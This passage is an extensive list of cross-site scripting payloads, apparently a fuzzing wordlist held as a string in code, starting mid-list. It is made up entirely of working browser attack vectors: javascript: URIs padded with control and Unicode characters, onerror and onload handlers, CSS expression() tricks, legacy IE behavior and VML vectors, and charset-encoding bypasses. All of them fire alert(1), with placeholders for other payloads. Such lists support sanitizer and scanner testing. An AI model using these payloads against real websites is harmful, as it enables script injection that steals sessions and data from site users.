id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\x00javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\x10javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\xE2\\x80\\x82javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\x20javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\x13javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\x09javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\xE2\\x80\\x8Ajavascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\x14javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\x19javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\xE2\\x80\\xAFjavascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\x1Fjavascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\xE2\\x80\\x81javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\x1Djavascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\xE2\\x80\\x87javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\x07javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\xE1\\x9A\\x80javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\xE2\\x80\\x83javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\x04javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\x01javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\x08javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\xE2\\x80\\x84javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\xE2\\x80\\x86javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\xE3\\x80\\x80javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\x12javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\x0Djavascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\x0Ajavascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\x0Cjavascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\x15javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\xE2\\x80\\xA8javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\x16javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\x02javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\x1Bjavascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\x06javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\xE2\\x80\\xA9javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\xE2\\x80\\x85javascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\x1Ejavascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\xE2\\x81\\x9Fjavascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"\\x1Cjavascript:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"javascript\\x00:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"javascript\\x3A:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"javascript\\x09:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"javascript\\x0D:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n&lt;a href=\"javascript\\x0A:javascript:alert(1)\" id=\"fuzzelement1\"&gt;test&lt;/a&gt;\n`\"'&gt;&lt;img src=xxx:x \\x0Aonerror=javascript:alert(1)&gt;\n`\"'&gt;&lt;img src=xxx:x \\x22onerror=javascript:alert(1)&gt;\n`\"'&gt;&lt;img src=xxx:x \\x0Bonerror=javascript:alert(1)&gt;\n`\"'&gt;&lt;img src=xxx:x \\x0Donerror=javascript:alert(1)&gt;\n`\"'&gt;&lt;img src=xxx:x \\x2Fonerror=javascript:alert(1)&gt;\n`\"'&gt;&lt;img src=xxx:x \\x09onerror=javascript:alert(1)&gt;\n`\"'&gt;&lt;img src=xxx:x \\x0Conerror=javascript:alert(1)&gt;\n`\"'&gt;&lt;img src=xxx:x \\x00onerror=javascript:alert(1)&gt;\n`\"'&gt;&lt;img src=xxx:x \\x27onerror=javascript:alert(1)&gt;\n`\"'&gt;&lt;img src=xxx:x \\x20onerror=javascript:alert(1)&gt;\n\"`'&gt;&lt;script&gt;\\x3Bjavascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\x0Djavascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\xEF\\xBB\\xBFjavascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\xE2\\x80\\x81javascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\xE2\\x80\\x84javascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\xE3\\x80\\x80javascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\x09javascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\xE2\\x80\\x89javascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\xE2\\x80\\x85javascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\xE2\\x80\\x88javascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\x00javascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\xE2\\x80\\xA8javascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\xE2\\x80\\x8Ajavascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\xE1\\x9A\\x80javascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\x0Cjavascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\x2Bjavascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\xF0\\x90\\x96\\x9Ajavascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;-javascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\x0Ajavascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\xE2\\x80\\xAFjavascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\x7Ejavascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\xE2\\x80\\x87javascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\xE2\\x81\\x9Fjavascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\xE2\\x80\\xA9javascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\xC2\\x85javascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\xEF\\xBF\\xAEjavascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\xE2\\x80\\x83javascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\xE2\\x80\\x8Bjavascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\xEF\\xBF\\xBEjavascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\xE2\\x80\\x80javascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\x21javascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\xE2\\x80\\x82javascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\xE2\\x80\\x86javascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\xE1\\xA0\\x8Ejavascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\x0Bjavascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\x20javascript:alert(1)&lt;/script&gt;\n\"`'&gt;&lt;script&gt;\\xC2\\xA0javascript:alert(1)&lt;/script&gt;\n\"/&gt;&lt;img/onerror=\\x0Bjavascript:alert(1)\\x0Bsrc=xxx:x /&gt;\n\"/&gt;&lt;img/onerror=\\x22javascript:alert(1)\\x22src=xxx:x /&gt;\n\"/&gt;&lt;img/onerror=\\x09javascript:alert(1)\\x09src=xxx:x /&gt;\n\"/&gt;&lt;img/onerror=\\x27javascript:alert(1)\\x27src=xxx:x /&gt;\n\"/&gt;&lt;img/onerror=\\x0Ajavascript:alert(1)\\x0Asrc=xxx:x /&gt;\n\"/&gt;&lt;img/onerror=\\x0Cjavascript:alert(1)\\x0Csrc=xxx:x /&gt;\n\"/&gt;&lt;img/onerror=\\x0Djavascript:alert(1)\\x0Dsrc=xxx:x /&gt;\n\"/&gt;&lt;img/onerror=\\x60javascript:alert(1)\\x60src=xxx:x /&gt;\n\"/&gt;&lt;img/onerror=\\x20javascript:alert(1)\\x20src=xxx:x /&gt;\n&lt;script\\x2F&gt;javascript:alert(1)&lt;/script&gt;\n&lt;script\\x20&gt;javascript:alert(1)&lt;/script&gt;\n&lt;script\\x0D&gt;javascript:alert(1)&lt;/script&gt;\n&lt;script\\x0A&gt;javascript:alert(1)&lt;/script&gt;\n&lt;script\\x0C&gt;javascript:alert(1)&lt;/script&gt;\n&lt;script\\x00&gt;javascript:alert(1)&lt;/script&gt;\n&lt;script\\x09&gt;javascript:alert(1)&lt;/script&gt;\n`\"'&gt;&lt;img src=xxx:x onerror\\x0B=javascript:alert(1)&gt;\n`\"'&gt;&lt;img src=xxx:x onerror\\x00=javascript:alert(1)&gt;\n`\"'&gt;&lt;img src=xxx:x onerror\\x0C=javascript:alert(1)&gt;\n`\"'&gt;&lt;img src=xxx:x onerror\\x0D=javascript:alert(1)&gt;\n`\"'&gt;&lt;img src=xxx:x onerror\\x20=javascript:alert(1)&gt;\n`\"'&gt;&lt;img src=xxx:x onerror\\x0A=javascript:alert(1)&gt;\n`\"'&gt;&lt;img src=xxx:x onerror\\x09=javascript:alert(1)&gt;\n&lt;script&gt;javascript:alert(1)&lt;\\x00/script&gt;\n&lt;img src=# onerror\\x3D\"javascript:alert(1)\" &gt;\n&lt;input onfocus=javascript:alert(1) autofocus&gt;\n&lt;input onblur=javascript:alert(1) autofocus&gt;&lt;input autofocus&gt;\n&lt;video poster=javascript:javascript:alert(1)//\n&lt;body onscroll=javascript:alert(1)&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;...&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;...&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;...&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;...&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;...&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;\n&lt;form id=test onforminput=javascript:alert(1)&gt;&lt;input&gt;&lt;/form&gt;&lt;button form=test onformchange=javascript:alert(1)&gt;X\n&lt;video&gt;&lt;source onerror=\"javascript:javascript:alert(1)\"&gt;\n&lt;video onerror=\"javascript:javascript:alert(1)\"&gt;&lt;source&gt;\n&lt;form&gt;&lt;button formaction=\"javascript:javascript:alert(1)\"&gt;X\n&lt;body oninput=javascript:alert(1)&gt;&lt;input autofocus&gt;\n&lt;math href=\"javascript:javascript:alert(1)\"&gt;CLICKME&lt;/math&gt;  &lt;math&gt; &lt;maction actiontype=\"statusline#http://google.com\" xlink:href=\"javascript:javascript:alert(1)\"&gt;CLICKME&lt;/maction&gt; &lt;/math&gt;\n&lt;frameset onload=javascript:alert(1)&gt;\n&lt;table background=\"javascript:javascript:alert(1)\"&gt;\n&lt;!--&lt;img src=\"--&gt;&lt;img src=x onerror=javascript:alert(1)//\"&gt;\n&lt;comment&gt;&lt;img src=\"&lt;/comment&gt;&lt;img src=x onerror=javascript:alert(1))//\"&gt;\n&lt;![&gt;&lt;img src=\"]&gt;&lt;img src=x onerror=javascript:alert(1)//\"&gt;\n&lt;style&gt;&lt;img src=\"&lt;/style&gt;&lt;img src=x onerror=javascript:alert(1)//\"&gt;\n&lt;li style=list-style:url() onerror=javascript:alert(1)&gt; &lt;div style=content:url(data:image/svg+xml,%%3Csvg/%%3E);visibility:hidden onload=javascript:alert(1)&gt;&lt;/div&gt;\n&lt;head&gt;&lt;base href=\"javascript://\"&gt;&lt;/head&gt;&lt;body&gt;&lt;a href=\"/. /,javascript:alert(1)//#\"&gt;XXX&lt;/a&gt;&lt;/body&gt;\n&lt;SCRIPT FOR=document EVENT=onreadystatechange&gt;javascript:alert(1)&lt;/SCRIPT&gt;\n&lt;OBJECT CLASSID=\"clsid:333C7BC4-460F-11D0-BC04-0080C7055A83\"&gt;&lt;PARAM NAME=\"DataURL\" VALUE=\"javascript:alert(1)\"&gt;&lt;/OBJECT&gt;\n&lt;object data=\"data:text/html;base64,%(base64)s\"&gt;\n&lt;embed src=\"data:text/html;base64,%(base64)s\"&gt;\n&lt;b &lt;script&gt;alert(1)&lt;/script&gt;0\n&lt;div id=\"div1\"&gt;&lt;input value=\"``onmouseover=javascript:alert(1)\"&gt;&lt;/div&gt; &lt;div id=\"div2\"&gt;&lt;/div&gt;&lt;script&gt;document.getElementById(\"div2\").innerHTML = document.getElementById(\"div1\").innerHTML;&lt;/script&gt;\n&lt;x '=\"foo\"&gt;&lt;x foo='&gt;&lt;img src=x onerror=javascript:alert(1)//'&gt;\n&lt;embed src=\"javascript:alert(1)\"&gt;\n&lt;img src=\"javascript:alert(1)\"&gt;\n&lt;image src=\"javascript:alert(1)\"&gt;\n&lt;script src=\"javascript:alert(1)\"&gt;\n&lt;div style=width:1px;filter:glow onfilterchange=javascript:alert(1)&gt;x\n&lt;? foo=\"&gt;&lt;script&gt;javascript:alert(1)&lt;/script&gt;\"&gt;\n&lt;! foo=\"&gt;&lt;script&gt;javascript:alert(1)&lt;/script&gt;\"&gt;\n&lt;/ foo=\"&gt;&lt;script&gt;javascript:alert(1)&lt;/script&gt;\"&gt;\n&lt;? foo=\"&gt;&lt;x foo='?&gt;&lt;script&gt;javascript:alert(1)&lt;/script&gt;'&gt;\"&gt;\n&lt;! foo=\"[[[Inception]]\"&gt;&lt;x foo=\"]foo&gt;&lt;script&gt;javascript:alert(1)&lt;/script&gt;\"&gt;\n&lt;% foo&gt;&lt;x foo=\"%&gt;&lt;script&gt;javascript:alert(1)&lt;/script&gt;\"&gt;\n&lt;div id=d&gt;&lt;x xmlns=\"&gt;&lt;iframe onload=javascript:alert(1)\"&gt;&lt;/div&gt; &lt;script&gt;d.innerHTML=d.innerHTML&lt;/script&gt;\n&lt;img \\x00src=x onerror=\"alert(1)\"&gt;\n&lt;img \\x47src=x onerror=\"javascript:alert(1)\"&gt;\n&lt;img \\x11src=x onerror=\"javascript:alert(1)\"&gt;\n&lt;img \\x12src=x onerror=\"javascript:alert(1)\"&gt;\n&lt;img\\x47src=x onerror=\"javascript:alert(1)\"&gt;\n&lt;img\\x10src=x onerror=\"javascript:alert(1)\"&gt;\n&lt;img\\x13src=x onerror=\"javascript:alert(1)\"&gt;\n&lt;img\\x32src=x onerror=\"javascript:alert(1)\"&gt;\n&lt;img\\x47src=x onerror=\"javascript:alert(1)\"&gt;\n&lt;img\\x11src=x onerror=\"javascript:alert(1)\"&gt;\n&lt;img \\x47src=x onerror=\"javascript:alert(1)\"&gt;\n&lt;img \\x34src=x onerror=\"javascript:alert(1)\"&gt;\n&lt;img \\x39src=x onerror=\"javascript:alert(1)\"&gt;\n&lt;img \\x00src=x onerror=\"javascript:alert(1)\"&gt;\n&lt;img src\\x09=x onerror=\"javascript:alert(1)\"&gt;\n&lt;img src\\x10=x onerror=\"javascript:alert(1)\"&gt;\n&lt;img src\\x13=x onerror=\"javascript:alert(1)\"&gt;\n&lt;img src\\x32=x onerror=\"javascript:alert(1)\"&gt;\n&lt;img src\\x12=x onerror=\"javascript:alert(1)\"&gt;\n&lt;img src\\x11=x onerror=\"javascript:alert(1)\"&gt;\n&lt;img src\\x00=x onerror=\"javascript:alert(1)\"&gt;\n&lt;img src\\x47=x onerror=\"javascript:alert(1)\"&gt;\n&lt;img src=x\\x09onerror=\"javascript:alert(1)\"&gt;\n&lt;img src=x\\x10onerror=\"javascript:alert(1)\"&gt;\n&lt;img src=x\\x11onerror=\"javascript:alert(1)\"&gt;\n&lt;img src=x\\x12onerror=\"javascript:alert(1)\"&gt;\n&lt;img src=x\\x13onerror=\"javascript:alert(1)\"&gt;\n&lt;img[a][b][c]src[d]=x[e]onerror=[f]\"alert(1)\"&gt;\n&lt;img src=x onerror=\\x09\"javascript:alert(1)\"&gt;\n&lt;img src=x onerror=\\x10\"javascript:alert(1)\"&gt;\n&lt;img src=x onerror=\\x11\"javascript:alert(1)\"&gt;\n&lt;img src=x onerror=\\x12\"javascript:alert(1)\"&gt;\n&lt;img src=x onerror=\\x32\"javascript:alert(1)\"&gt;\n&lt;img src=x onerror=\\x00\"javascript:alert(1)\"&gt;\n&lt;a href=java&amp;#1&amp;#2&amp;#3&amp;#4&amp;#5&amp;#6&amp;#7&amp;#8&amp;#11&amp;#12script:javascript:alert(1)&gt;XXX&lt;/a&gt;\n&lt;img src=\"x` `&lt;script&gt;javascript:alert(1)&lt;/script&gt;\"` `&gt;\n&lt;img src onerror /\" '\"= alt=javascript:alert(1)//\"&gt;\n&lt;title onpropertychange=javascript:alert(1)&gt;&lt;/title&gt;&lt;title title=&gt;\n&lt;a href=http://foo.bar/#x=`y&gt;&lt;/a&gt;&lt;img alt=\"`&gt;&lt;img src=x:x onerror=javascript:alert(1)&gt;&lt;/a&gt;\"&gt;\n&lt;!--[if]&gt;&lt;script&gt;javascript:alert(1)&lt;/script --&gt;\n&lt;!--[if&lt;img src=x onerror=javascript:alert(1)//]&gt; --&gt;\n&lt;script src=\"/\\%(jscript)s\"&gt;&lt;/script&gt;\n&lt;script src=\"\\\\%(jscript)s\"&gt;&lt;/script&gt;\n&lt;object id=\"x\" classid=\"clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598\"&gt;&lt;/object&gt; &lt;object classid=\"clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B\" onqt_error=\"javascript:alert(1)\" style=\"behavior:url(#x);\"&gt;&lt;param name=postdomevents /&gt;&lt;/object&gt;\n&lt;a style=\"-o-link:'javascript:javascript:alert(1)';-o-link-source:current\"&gt;X\n&lt;style&gt;p[foo=bar{}*{-o-link:'javascript:javascript:alert(1)'}{}*{-o-link-source:current}]{color:red};&lt;/style&gt;\n&lt;link rel=stylesheet href=data:,*%7bx:expression(javascript:alert(1))%7d\n&lt;style&gt;@import \"data:,*%7bx:expression(javascript:alert(1))%7D\";&lt;/style&gt;\n&lt;a style=\"pointer-events:none;position:absolute;\"&gt;&lt;a style=\"position:absolute;\" onclick=\"javascript:alert(1);\"&gt;XXX&lt;/a&gt;&lt;/a&gt;&lt;a href=\"javascript:javascript:alert(1)\"&gt;XXX&lt;/a&gt;\n&lt;style&gt;*[{}@import'%(css)s?]&lt;/style&gt;X\n&lt;div style=\"font-family:'foo&amp;#10;;color:red;';\"&gt;XXX\n&lt;div style=\"font-family:foo}color=red;\"&gt;XXX\n&lt;// style=x:expression\\28javascript:alert(1)\\29&gt;\n&lt;style&gt;*{x:\uff45\uff58\uff50\uff52\uff45\uff53\uff53\uff49\uff4f\uff4e(javascript:alert(1))}&lt;/style&gt;\n&lt;div style=content:url(%(svg)s)&gt;&lt;/div&gt;\n&lt;div style=\"list-style:url(http://foo.f)\\20url(javascript:javascript:alert(1));\"&gt;X\n&lt;div id=d&gt;&lt;div style=\"font-family:'sans\\27\\3B color\\3Ared\\3B'\"&gt;X&lt;/div&gt;&lt;/div&gt; &lt;script&gt;with(document.getElementById(\"d\"))innerHTML=innerHTML&lt;/script&gt;\n&lt;div style=\"background:url(/f#&amp;#127;oo/;color:red/*/foo.jpg);\"&gt;X\n&lt;div style=\"font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);\"&gt;X\n&lt;div id=\"x\"&gt;XXX&lt;/div&gt; &lt;style&gt;  #x{font-family:foo[bar;color:green;}  #y];color:red;{}  &lt;/style&gt;\n&lt;x style=\"background:url('x&amp;#1;;color:red;/*')\"&gt;XXX&lt;/x&gt;\n&lt;script&gt;({set/**/$($){_/**/setter=$,_=javascript:alert(1)}}).$=eval&lt;/script&gt;\n&lt;script&gt;({0:#0=eval/#0#/#0#(javascript:alert(1))})&lt;/script&gt;\n&lt;script&gt;ReferenceError.prototype.__defineGetter__('name', function(){javascript:alert(1)}),x&lt;/script&gt;\n&lt;script&gt;Object.__noSuchMethod__ = Function,[{}][0].constructor._('javascript:alert(1)')()&lt;/script&gt;\n&lt;meta charset=\"x-imap4-modified-utf7\"&gt;&amp;ADz&amp;AGn&amp;AG0&amp;AEf&amp;ACA&amp;AHM&amp;AHI&amp;AGO&amp;AD0&amp;AGn&amp;ACA&amp;AG8Abg&amp;AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&amp;ACAAPABi\n&lt;meta charset=\"x-imap4-modified-utf7\"&gt;&amp;&lt;script&amp;S1&amp;TS&amp;1&gt;alert&amp;A7&amp;(1)&amp;R&amp;UA;&amp;&amp;&lt;&amp;A9&amp;11/script&amp;X&amp;&gt;\n&lt;meta charset=\"mac-farsi\"&gt;\u00bcscript\u00bejavascript:alert(1)\u00bc/script\u00be\nX&lt;x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` &gt;\n1&lt;set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&amp;#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&amp;lt;img/src=&amp;quot;x&amp;quot;onerror=javascript:alert(1)&amp;gt;`&gt;\n1&lt;animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&amp;lt;img/src=&amp;quot;.&amp;quot;onerror=javascript:alert(1)&amp;gt;&gt;\n&lt;vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=%(vml)s#xss&gt;&lt;/vmlframe&gt;\n1&lt;a href=#&gt;&lt;line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:javascript:alert(1) strokecolor=white strokeweight=1000px from=0 to=1000 /&gt;&lt;/a&gt;\n&lt;a style=\"behavior:url(#default#AnchorClick);\" folder=\"javascript:javascript:alert(1)\"&gt;XXX&lt;/a&gt;\n&lt;x style=\"behavior:url(%(sct)s)\"&gt;\n&lt;xml id=\"xss\" src=\"%(htc)s\"&gt;&lt;/xml&gt; &lt;label dataformatas=\"html\" datasrc=\"#xss\" datafld=\"payload\"&gt;&lt;/label&gt;\n&lt;event-source src=\"%(event)s\" onload=\"javascript:alert(1)\"&gt;\n&lt;a href=\"javascript:javascript:alert(1)\"&gt;&lt;event-source src=\"data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A\"&gt;\n&lt;div id=\"x\"&gt;x&lt;/div&gt; &lt;xml:namespace prefix=\"t\"&gt; &lt;import namespace=\"t\" implementation=\"#default#time2\"&gt; &lt;t:set attributeName=\"innerHTML\" targetElement=\"x\" to=\"&amp;lt;img&amp;#11;src=x:x&amp;#11;onerror&amp;#11;=javascript:alert(1)&amp;gt;\"&gt;\n&lt;script&gt;%(payload)s&lt;/script&gt;\n&lt;script src=%(jscript)s&gt;&lt;/script&gt;\n&lt;script language='javascript' src='%(jscript)s'&gt;&lt;/script&gt;\n&lt;script&gt;javascript:alert(1)&lt;/script&gt;\n&lt;IMG SRC=\"javascript:javascript:alert(1);\"&gt;\n&lt;IMG SRC=javascript:javascript:alert(1)&gt;\n&lt;IMG SRC=`javascript:javascript:alert(1)`&gt;\n&lt;SCRIPT SRC=%(jscript)s?&lt;B&gt;\n&lt;FRAMESET&gt;&lt;FRAME SRC=\"javascript:javascript:alert(1);\"&gt;&lt;/FRAMESET&gt;\n&lt;BODY ONLOAD=javascript:alert(1)&gt;\n&lt;BODY ONLOAD=javascript:javascript:alert(1)&gt;\n&lt;IMG SRC=\"jav    ascript:javascript:alert(1);\"&gt;\n&lt;BODY onload!#$%%&amp;()*~+-_.,:;?@[/|\\]^`=javascript:alert(1)&gt;\n&lt;SCRIPT/SRC=\"%(jscript)s\"&gt;&lt;/SCRIPT&gt;\n&lt;&lt;SCRIPT&gt;%(payload)s//&lt;&lt;/SCRIPT&gt;\n&lt;IMG SRC=\"javascript:javascript:alert(1)\"\n&lt;iframe src=%(scriptlet)s &lt;\n&lt;INPUT TYPE=\"IMAGE\" SRC=\"javascript:javascript:alert(1);\"&gt;\n&lt;IMG DYNSRC=\"javascript:javascript:alert(1)\"&gt;\n&lt;IMG LOWSRC=\"javascript:javascript:alert(1)\"&gt;\n&lt;BGSOUND SRC=\"javascript:javascript:alert(1);\"&gt;\n&lt;BR SIZE=\"&amp;{javascript:alert(1)}\"&gt;\n&lt;LAYER SRC=\"%(scriptlet)s\"&gt;&lt;/LAYER&gt;\n&lt;LINK REL=\"stylesheet\" HREF=\"javascript:javascript:alert(1);\"&gt;\n&lt;STYLE&gt;@import'%(css)s';&lt;/STYLE&gt;\n&lt;META HTTP-EQUIV=\"Link\" Content=\"&lt;%(css)s&gt;; REL=stylesheet\"&gt;\n&lt;XSS STYLE=\"behavior: url(%(htc)s);\"&gt;\n&lt;STYLE&gt;li {list-style-image: url(\"javascript:javascript:alert(1)\");}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS\n&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:javascript:alert(1);\"&gt;\n&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:javascript:alert(1);\"&gt;\n&lt;IFRAME SRC=\"javascript:javascript:alert(1);\"&gt;&lt;/IFRAME&gt;\n&lt;TABLE BACKGROUND=\"javascript:javascript:alert(1)\"&gt;\n&lt;TABLE&gt;&lt;TD BACKGROUND=\"javascript:javascript:alert(1)\"&gt;\n&lt;DIV STYLE=\"background-image: url(javascript:javascript:alert(1))\"&gt;\n&lt;DIV STYLE=\"width:expression(javascript:alert(1));\"&gt;\n&lt;IMG STYLE=\"xss:expr/*XSS*/ession(javascript:alert(1))\"&gt;\n&lt;XSS STYLE=\"xss:expression(javascript:alert(1))\"&gt;\n&lt;STYLE TYPE=\"text/javascript\"&gt;javascript:alert(1);&lt;/STYLE&gt;\n&lt;STYLE&gt;.XSS{background-image:url(\"javascript:javascript:alert(1)\");}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;\n&lt;STYLE type=\"text/css\"&gt;BODY{background:url(\"javascript:javascript:alert(1)\")}&lt;/STYLE&gt;\n&lt;!--[if gte IE 4]&gt;&lt;SCRIPT&gt;javascript:alert(1);&lt;/SCRIPT&gt;&lt;![endif]--&gt;\n&lt;BASE HREF=\"javascript:javascript:alert(1);//\"&gt;\n&lt;OBJECT TYPE=\"text/x-scriptlet\" DATA=\"%(scriptlet)s\"&gt;&lt;/OBJECT&gt;\n&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript:javascript:alert(1)&gt;&lt;/OBJECT&gt;\n&lt;HTML xmlns:xss&gt;&lt;?import namespace=\"xss\" implementation=\"%(htc)s\"&gt;&lt;xss:xss&gt;XSS&lt;/xss:xss&gt;&lt;/HTML&gt;\"\"\",\"XML 